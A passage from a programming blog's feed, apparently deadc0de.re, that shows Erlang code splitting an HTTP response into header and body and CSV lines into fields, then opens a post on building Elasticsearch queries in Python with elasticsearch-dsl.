&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;read_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/tmp/response&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;binary_to_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r\n\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;Header&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Body&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;lists&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Offset&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;HTTP/1.1 302 Found&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Cache-Control: private&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Content-Type: text/html; charset=UTF-8&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Location: ...&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Content-Length: 256&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Date: ...&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Server: GFE/2.0&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;meta http-equiv=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;content-type&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt; content=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;text/html;charset=utf-8&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;TITLE&amp;gt;302 Moved&amp;lt;/TITLE&amp;gt;&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;H1&amp;gt;302 Moved&amp;lt;/H1&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;The document has moved&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;A HREF=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;...&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;here&amp;lt;/A&amp;gt;.&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is a bit better but we still have to strip the two returned strings in order
to remove the separator &lt;code&gt;\r\n&lt;/code&gt;. Moreover, as the previous example, you cannot
easily split a string in more than two fields.&lt;/p&gt;
&lt;h2&gt;Coding way&lt;/h2&gt;
&lt;p&gt;This is IMHO the best way for our use-case. Unlike the other
solutions this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;is easily customizable&lt;/li&gt;
&lt;li&gt;handles errors and cases when no match is found&lt;/li&gt;
&lt;li&gt;looks very elegant and uses erlang's power&lt;/li&gt;
&lt;li&gt;[bonus] allows to split in more than two fields&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Without further introduction, here's how I did this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="ni"&gt;define&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;CRLF&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;

&lt;span class="nf"&gt;parse_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nv"&gt;CRLF&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nv"&gt;CRLF&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt; &lt;span class="nv"&gt;Rest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nn"&gt;lists&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;reverse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;++?&lt;/span&gt;&lt;span class="nv"&gt;CRLF&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Rest&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="nf"&gt;parse_response&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nv"&gt;H&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="nv"&gt;T&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="n"&gt;parse_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;T&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;H&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;span class="nf"&gt;parse_response&lt;/span&gt;&lt;span class="p"&gt;([],&lt;/span&gt; &lt;span class="p"&gt;_&lt;/span&gt;&lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This allows, using list comprehension and pattern matching, to nicely
separate the header of the body:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;read_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/tmp/response&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;binary_to_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;parse_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[]).&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;HTTP/1.1 302 Found&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Cache-Control: private&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Content-Type: text/html; charset=UTF-8&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Location: ...&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Content-Length: 256&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Date: ...&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Server: GFE/2.0&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;meta http-equiv=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;content-type&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt; content=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;text/html;charset=utf-8&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;TITLE&amp;gt;302 Moved&amp;lt;/TITLE&amp;gt;&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;H1&amp;gt;302 Moved&amp;lt;/H1&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;The document has moved&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;A HREF=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;...&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;here&amp;lt;/A&amp;gt;.&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A little explanation on how that works:&lt;/p&gt;
&lt;p&gt;While no successive CRLFs are found, go through the string, char by char
(using &lt;code&gt;[H|T]&lt;/code&gt;), and prepend the processed char (&lt;code&gt;H&lt;/code&gt;) to the accumulator.
Once two CRLFs are found, we reverse the accumulator (since
it was built in reverse order) and construct the resulting list.
If no &lt;code&gt;\r\n\r\n&lt;/code&gt; is found, a list of two empty lists is returned.&lt;/p&gt;
&lt;p&gt;This function can then be improved to handle the splitting of several fields,
as for example in a csv line where fields are separated by a comma. We wouldn't
be able to use &lt;code&gt;string:tokens&lt;/code&gt; since we want to be able to see empty fields:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="ni"&gt;define&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;SEP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;,&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;

&lt;span class="nf"&gt;parse_line&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nv"&gt;SEP&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt; &lt;span class="nv"&gt;Rest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nn"&gt;lists&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;reverse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;))|&lt;/span&gt;&lt;span class="n"&gt;parse_line&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Rest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[])];&lt;/span&gt;
&lt;span class="nf"&gt;parse_line&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nv"&gt;H&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="nv"&gt;T&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="n"&gt;parse_line&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;T&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;H&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;span class="nf"&gt;parse_line&lt;/span&gt;&lt;span class="p"&gt;([],&lt;/span&gt; &lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nn"&gt;lists&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;reverse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;))].&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;resulting in (you can see the difference with &lt;code&gt;string:tokens&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;field1,ofjeofje    ,field3, foefjoejfe,    field5,,&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;field1,ofjeofje    ,field3, foefjoejfe,    field5,,&amp;quot;&lt;/span&gt;
&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;parse_line&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[]).&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;field1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ofjeofje&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;field3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;foefjoejfe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;field5&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,[],[]]&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;tokens&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;,&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;field1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ofjeofje    &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;field3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot; foefjoejfe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;    field5&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since this is easily customizable, one could think of parsing the header's fields
(the fields separator is &lt;code&gt;\r\n&lt;/code&gt; and the key-value separator is &lt;code&gt;:&lt;/code&gt;) and put
them in a &lt;a href="http://erlang.org/doc/man/maps.html"&gt;map&lt;/a&gt; for easy retrieval. I let
that coding exercise to the reader ;-)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Happy coding !!&lt;/strong&gt;&lt;/p&gt;</content><category term="erlang"></category><category term="parsing"></category></entry><entry><title>Query Elasticsearch with Python</title><link href="https://deadc0de.re/articles/python-es.html" rel="alternate"></link><published>2016-02-01T00:00:00+01:00</published><updated>2016-02-01T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-02-01:/articles/python-es.html</id><summary type="html">&lt;p&gt;Query Elasticsearch using Python and scroll&lt;/p&gt;</summary><content type="html">&lt;p&gt;Before, when I needed to query an elasticsearch cluster and retrieve data, I always
ended up doing some curl-fu. It's nice and quick however if you want to retrieve
a lot of data and are in the need of something more powerful you need something
else. Moreover json is aweful to deal with on the command line !&lt;/p&gt;
&lt;p&gt;I came across those two python libraries which are quite nice:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://elasticsearch-py.readthedocs.org/"&gt;Elasticsearch-py&lt;/a&gt;: the
    official low-level library for querying elasticsearch&lt;/li&gt;
&lt;li&gt;&lt;a href="https://elasticsearch-dsl.readthedocs.org/"&gt;Elasticsearch-dsl&lt;/a&gt;: the
    high-level library built above elasticsearch-py&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Combining those two libraries provides you with really powerful ways to
insert, query and manage your ES's data.
I won't describe in details the use of those libraries but there are two main
features I've used and found very nice:&lt;/p&gt;
&lt;h3&gt;Filtering&lt;/h3&gt;
&lt;p&gt;With these libraries, constructing your query is now way easier than
using some json:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;elasticsearch&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;elasticsearch_dsl&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Search&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Q&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;F&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="n"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;elasticsearch&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Elasticsearch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ES_HOST&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;using&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;INDEX&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# only return specific fields&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fields&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;field0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;field1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

&lt;span class="c1"&gt;# add some filters&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;term&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SOMETYPE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;range&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;gt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;term&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;othercount&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="c1"&gt;# sort the results&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;count&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;order&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;desc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}})&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


